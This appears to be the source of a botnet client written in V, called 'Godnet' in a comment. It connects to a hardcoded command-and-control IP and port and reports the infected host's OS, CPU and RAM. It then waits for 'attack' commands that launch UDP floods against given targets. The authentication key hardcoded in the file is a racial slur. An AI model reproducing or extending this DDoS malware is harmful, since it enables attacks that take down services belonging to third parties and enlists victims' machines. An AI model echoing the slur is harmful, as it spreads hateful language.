import io
import os
import net
import rand

#include "@VROOT/methods/udp.c"
#include "@VROOT/methods/http.c"
// #include "@VROOT/methods/tcp.c"

fn C.udp_bypass(&char, u16, int)
fn C.sendHTTP(&char, int)
fn send_udp(ip string, p u16, t int) { C.udp_bypass(&char(ip.str), p, t) }
fn send_http(ip string, t int) { C.sendHTTP(&char(ip.str), t) }

pub const (
	backend_ip 		= "74.50.67.38"
	backend_port 	= 420
	secret_key 		= "NIGGERBOB"
)

pub struct DeviceInfo 
{
	// os, arch, cpu, ram etc
	pub mut:
		os		string
		cpu		string
		arch	string
		cores 	string
		ram 	string
}

fn main() 
{
	for {
		t := go listen()
		t.wait()
	}
}

fn listen()
{
	mut net_socket := net.dial_tcp("${backend_ip}:${backend_port}") or {
		println("[ X ] Error, Unable to start server....")
		return
	}

	mut reader := io.new_buffered_reader(reader: net_socket)

	/*
		secret_key
		device_info
	*/
	mut device_info := get_device_info()
	net_socket.write_string("${secret_key}\n") or { 0 }
	net_socket.write_string("${device_info.to_str()}'}\n") or { 0 }

	/* Listen To The Godnet CNC Server For New Attacks */
	for {
		data := reader.read_line() or { "" }
		args := data.split(" ")
		cmd := args[0]

		if data.len < 3 { continue }
		
		match cmd 
		{
			"attack" {

				if args.len == 5 {
					match args[4]
					{
						"udp" {
							go send_udp(args[1], args[2].u16(), args[3].int())
							net_socket.write_string("ATTACK SENT\n") or { 0 }
						}
						"tcp" {
							// go methods.tcp_flood(args[1], args[2], args[3])
							net_socket.write_string("Coming soon....\n") or { 0 }
						} 
						"std" {
							// go hexflood(args[1], args[2].int(), args[3].int())
							net_socket.write_string("Coming soon....\n") or { 0 }
						} else {}
					}
				} else {
					println("[ X ] Error, An attack was caught but corrupted!\r\n=> ${args.len} ${args}")
				}

			} else {}
		}
		println("${data}")
	}
}

pub fn get_device_info() DeviceInfo
{

	/* Get CPU Info */
	lscpu := os.execute("lscpu").output.split("\n")

	mut cpu_cores := ""
	mut cpu_name := ""

	for line in lscpu 
	{
		if line.starts_with("CPU(s):")
		{ cpu_cores = line.replace("CPU(s):", "").trim_space() }
		else if line.starts_with("Model name:")
		{ cpu_name = line.replace("Model name:", "").trim_space() }
	}

	os_release := os.execute("cat /etc/os-release").output.split("\n")
	mut os_name := ""
	for line in os_release
	{ if line.starts_with("NAME=\"") { os_name = line.replace("NAME=\"", "").trim_space() } }

	return DeviceInfo{ 	
		os: os_name.replace("\"", "").trim_space()
		cpu: cpu_name.trim_space(), 
		arch: lscpu[0].replace("Architecture:", "").trim_space(), 
		cores: cpu_cores.trim_space(),
		ram: os.execute("cat /proc/meminfo").output.replace("MemTotal:", "").replace(" ", "").trim_space()
	}
}

pub fn (mut d DeviceInfo) to_str() map[string]string
{
	return { "os": d.os,
			 "cpu": d.cpu,
			 "arch": d.arch,
			 "cores": d.cores,
			 "ram": d.ram }
}